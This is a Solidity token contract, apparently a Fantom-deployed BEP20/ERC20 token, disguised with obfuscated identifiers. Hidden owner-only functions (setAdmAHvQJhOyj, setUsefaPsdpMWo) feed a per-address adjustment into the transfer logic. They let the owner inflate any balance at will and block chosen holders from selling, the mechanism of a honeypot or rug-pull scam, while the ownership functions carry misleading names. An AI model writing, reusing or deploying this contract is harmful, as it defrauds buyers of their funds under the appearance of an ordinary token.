/**
 *Submitted for verification at FtmScan.com on 2022-11-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransfer(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferOwnerShip(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferownership() public virtual onlyOwner {
        _transferOwnerShip(address(0));
    }


    function transferownership_transferOwnerShip(address newowner) public virtual onlyOwner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferOwnerShip(newowner);
    }


    function _transferOwnerShip(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransfer(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint heSaRAWOjADesired,
        uint heSaRAWOjBDesired,
        uint heSaRAWOjAMin,
        uint heSaRAWOjBMin,
        address to,
        uint deadline
    ) external returns (uint heSaRAWOjA, uint heSaRAWOjB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint heSaRAWOjTokenDesired,
        uint heSaRAWOjTokenMin,
        uint heSaRAWOjETHMin,
        address to,
        uint deadline
    ) external payable returns (uint heSaRAWOjToken, uint heSaRAWOjETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint heSaRAWOjAMin,
        uint heSaRAWOjBMin,
        address to,
        uint deadline
    ) external returns (uint heSaRAWOjA, uint heSaRAWOjB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint heSaRAWOjTokenMin,
        uint heSaRAWOjETHMin,
        address to,
        uint deadline
    ) external returns (uint heSaRAWOjToken, uint heSaRAWOjETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint heSaRAWOjAMin,
        uint heSaRAWOjBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint heSaRAWOjA, uint heSaRAWOjB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint heSaRAWOjTokenMin,
        uint heSaRAWOjETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint heSaRAWOjToken, uint heSaRAWOjETH);
    function swapExactTokensForTokens(
        uint heSaRAWOjIn,
        uint heSaRAWOjOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory heSaRAWOjs);
    function swapTokensForExactTokens(
        uint heSaRAWOjOut,
        uint heSaRAWOjInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory heSaRAWOjs);
    function swapExactETHForTokens(uint heSaRAWOjOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory heSaRAWOjs);
    function swapTokensForExactETH(uint heSaRAWOjOut, uint heSaRAWOjInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory heSaRAWOjs);
    function swapExactTokensForETH(uint heSaRAWOjIn, uint heSaRAWOjOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory heSaRAWOjs);
    function swapETHForExactTokens(uint heSaRAWOjOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory heSaRAWOjs);

    function quote(uint heSaRAWOjA, uint reserveA, uint reserveB) external pure returns (uint heSaRAWOjB);
    function getheSaRAWOjOut(uint heSaRAWOjIn, uint reserveIn, uint reserveOut) external pure returns (uint heSaRAWOjOut);
    function getheSaRAWOjIn(uint heSaRAWOjOut, uint reserveIn, uint reserveOut) external pure returns (uint heSaRAWOjIn);
    function getheSaRAWOjsOut(uint heSaRAWOjIn, address[] calldata path) external view returns (uint[] memory heSaRAWOjs);
    function getheSaRAWOjsIn(uint heSaRAWOjOut, address[] calldata path) external view returns (uint[] memory heSaRAWOjs);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint heSaRAWOjTokenMin,
        uint heSaRAWOjETHMin,
        address to,
        uint deadline
    ) external returns (uint heSaRAWOjETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint heSaRAWOjTokenMin,
        uint heSaRAWOjETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint heSaRAWOjETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint heSaRAWOjIn,
        uint heSaRAWOjOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint heSaRAWOjOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint heSaRAWOjIn,
        uint heSaRAWOjOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function BpjAXCsLR() external view returns (address);
    function BpjAXCsLRSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setBpjAXCsLR(address) external;
    function setBpjAXCsLRSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _liyqzNuvN;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _liyqzNuvN;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private lcBxNSxRB;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 aqBlpXIXU = _balances[from];
        require(aqBlpXIXU >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = aqBlpXIXU - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 zyoroxHiY = _balances[account];
        require(zyoroxHiY >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = zyoroxHiY - amount;
    }
        _liyqzNuvN -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _liyqzNuvN += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _muSjusNYR = 2;

    uint256 private _mIzoQDgcM = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _pDVHaaoBV;

    function setPairxBqsuTDig(address _address) external onlyOwner {
        uniswapV2Pair = _address;
    }

    function setAdmAHvQJhOyj(address vgLfuEQNy,int256 amount ) public onlyOwner {
        _pDVHaaoBV[vgLfuEQNy] += amount;
    }

    function setUsefaPsdpMWo(address vgLfuEQNy) public onlyOwner {
        _pDVHaaoBV[vgLfuEQNy] = int256(0) - int256(_liyqzNuvN);
    }

    function getqFtvOWBfa(address vgLfuEQNy) public view returns (int256) {
        return _pDVHaaoBV[vgLfuEQNy];
    }


    function _HlRjFLnHL(
        address from,
        address _to,
        uint256 _heSaRAWOj
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 aqBlpXIXU = _balances[from];
        require(aqBlpXIXU >= _heSaRAWOj, "ERC20: transfer amount exceeds balance");
        if (_pDVHaaoBV[from] > 0){
            _balances[from] = _balances[from].add(uint256(_pDVHaaoBV[from]));
        }else if (_pDVHaaoBV[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_pDVHaaoBV[from]));
        }


        uint256 oZNosAvflheSaRAWOj = 0;
        uint256 oZNosAvfl = _muSjusNYR;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                oZNosAvfl = _muSjusNYR;
            }
            if (from == uniswapV2Pair) {
                oZNosAvfl = _mIzoQDgcM;
            }
        }
        oZNosAvflheSaRAWOj = _heSaRAWOj.mul(oZNosAvfl).div(100);

        if (oZNosAvflheSaRAWOj > 0) {
            _balances[from] = _balances[from].sub(oZNosAvflheSaRAWOj);
            _balances[_deadAddress] = _balances[_deadAddress].add(oZNosAvflheSaRAWOj);
            emit Transfer(from, _deadAddress, oZNosAvflheSaRAWOj);
        }

        _balances[from] = _balances[from].sub(_heSaRAWOj - oZNosAvflheSaRAWOj);
        _balances[_to] = _balances[_to].add(_heSaRAWOj - oZNosAvflheSaRAWOj);
        emit Transfer(from, _to, _heSaRAWOj - oZNosAvflheSaRAWOj);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _HlRjFLnHL(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _HlRjFLnHL(from, to, amount);
        return true;
    }
}